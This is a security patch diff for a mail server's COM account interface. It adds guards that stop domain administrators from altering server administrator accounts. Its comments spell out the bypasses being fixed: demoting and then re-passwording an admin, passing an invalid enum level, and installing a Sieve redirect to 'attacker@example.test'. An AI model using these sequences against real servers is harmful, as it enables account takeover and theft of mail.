@@ -746,6 +746,43 @@ STDMETHODIMP InterfaceAccount::put_AdminLevel(eAdminLevel newVal)
       if (!object_)
          return GetAccessDenied();
 
+      // Above the switch, deliberately: this asks about the account being MODIFIED, not
+      // about the level being assigned, so it must hold on every path through this
+      // function.
+      //
+      // Save() carries a check for the same thing - "Only server administrators have
+      // access to change settings for server administrators" - and its comment describes
+      // the attack it was meant to stop: a server admin whose mailbox sits in a domain
+      // somebody else administers. But it asks object_->GetAdminLevel(), the IN-MEMORY
+      // value this setter has already overwritten, and nothing re-reads the stored one.
+      // So the guard was defeated by the property assignment that precedes it:
+      //
+      //    acct = domain.Accounts.ItemByAddress("boss@corp.com")  // a server admin
+      //    acct.AdminLevel = 0        // object_ becomes Normal
+      //    acct.Password = "..."
+      //    acct.Save()                // guard reads Normal, allows both writes
+      //
+      // A domain administrator could demote the server administrator and set their
+      // password in three lines. Refusing the change here is what makes Save()'s check
+      // reachable again: with the level unchanged it still reads ServerAdmin, so the
+      // password write is refused too.
+      //
+      // Putting this inside the Normal/DomainAdmin case - where it first went - was not
+      // enough. eAdminLevel is a COM enum, which is to say a long, and neither COM
+      // automation nor a vtable call range-checks it. The switch below has no default,
+      // so a value matching no case fell straight through to SetAdminLevel() and set the
+      // level to something that is neither ServerAdmin nor a valid level at all:
+      //
+      //    acct.AdminLevel = 3        // matches no case, guard never evaluated
+      //    acct.Password = "..."
+      //    acct.Save()                // 3 == ServerAdmin(2) is false, both writes allowed
+      //
+      // which is the same takeover by a different door, and PersistentAccount::SaveObject
+      // would have written the 3 to accountadminlevel without validating it either.
+      if (object_->GetAdminLevel() == HM::Account::ServerAdmin &&
+          !authentication_->GetIsServerAdmin())
+         return authentication_->GetAccessDenied();
+
       // Check that the user has permission to do this change.
       switch (newVal)
       {
@@ -754,9 +791,9 @@ STDMETHODIMP InterfaceAccount::put_AdminLevel(eAdminLevel newVal)
          {
             // The client wants to give this user normal or domain level
             // rights. This is OK if the user is domain or server admin.
-            if (!authentication_->GetIsDomainAdmin() && !authentication_->GetIsServerAdmin()) 
-               return authentication_->GetAccessDenied(); 
-   
+            if (!authentication_->GetIsDomainAdmin() && !authentication_->GetIsServerAdmin())
+               return authentication_->GetAccessDenied();
+
             break;
          }
       case hAdminLevelServerAdmin:
@@ -767,14 +804,21 @@ STDMETHODIMP InterfaceAccount::put_AdminLevel(eAdminLevel newVal)
                // don't need to change anything.
                return S_OK;
             }
-   
+
             if (!authentication_->GetIsServerAdmin())
             {
                // Only server admins are allowed to give other users server admin rights.
-               return authentication_->GetAccessDenied(); 
+               return authentication_->GetAccessDenied();
             }
-   
+
             break;
+         }
+      default:
+         {
+            // Anything else is not an admin level. Refused rather than stored, both
+            // because the value would be meaningless in accountadminlevel and because
+            // silently accepting it is what let the guard above be walked around.
+            return COMError::GenerateError("The specified administration level is not valid.");
          }
       }
    
@@ -964,8 +1008,36 @@ STDMETHODIMP InterfaceAccount::put_SieveScript(BSTR newVal)
          return GetAccessDenied();
 
       // The script is persisted to disk immediately (file-backed, not part of the
-      // account row), so this does not require a subsequent Save().
-      HM::SieveStorage::SetActiveScript(object_->GetAddress(), HM::String(newVal));
+      // account row), so this does not require a subsequent Save() - and that is
+      // exactly why it needs its own guard.
+      //
+      // Save() carries the check that stops a domain administrator altering a server
+      // administrator's account, for the case its comment describes: a server admin
+      // whose mailbox sits inside a domain somebody else administers. Every other
+      // sensitive property on this interface is written to object_ and therefore
+      // reaches that check. This one goes straight to the filesystem and bypassed it
+      // completely.
+      //
+      // A domain administrator could therefore install
+      //
+      //    require ["copy"]; redirect :copy "attacker@example.test";
+      //
+      // on the server administrator's account and receive a copy of all their mail.
+      // LocalDelivery reads that file on every delivery, so it takes effect at once,
+      // with no save and nothing to review. The same account's password could not be
+      // changed - only its mail could be redirected, which is worse.
+      if (!authentication_->GetIsServerAdmin())
+      {
+         if (object_->GetAdminLevel() == HM::Account::ServerAdmin)
+            return COMError::GenerateError("You do not have access to change the Sieve script of a server administrator account. Server administrator accounts can only be updated by server administrators.");
+      }
+
+      // Reported rather than discarded: SetActiveScript returns whether the file was
+      // written, and a disk-full or permission failure otherwise left the caller
+      // believing the filter was installed while mail kept being delivered unfiltered.
+      if (!HM::SieveStorage::SetActiveScript(object_->GetAddress(), HM::String(newVal)))
+         return COMError::GenerateError("The Sieve script could not be written to disk. Check the hMailServer error log.");
+
       return S_OK;
    }
    catch (...)
